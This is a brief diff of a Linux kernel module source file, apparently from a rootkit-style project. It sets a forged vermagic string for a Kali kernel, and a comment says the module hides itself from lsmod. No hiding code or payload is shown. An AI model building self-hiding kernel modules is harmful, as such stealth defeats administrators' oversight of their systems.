@@ -5,7 +5,7 @@
 #include <linux/init.h>    
 #include <linux/vermagic.h> 
 
-MODULE_INFO(vermagic, "123444");
+MODULE_INFO(vermagic, "4.6.0-kali1-686-pae SMP mod_unload modversions 686");
 static int lkm_init(void)
 {
     //Hide this module from kernel modules(lsmod) 
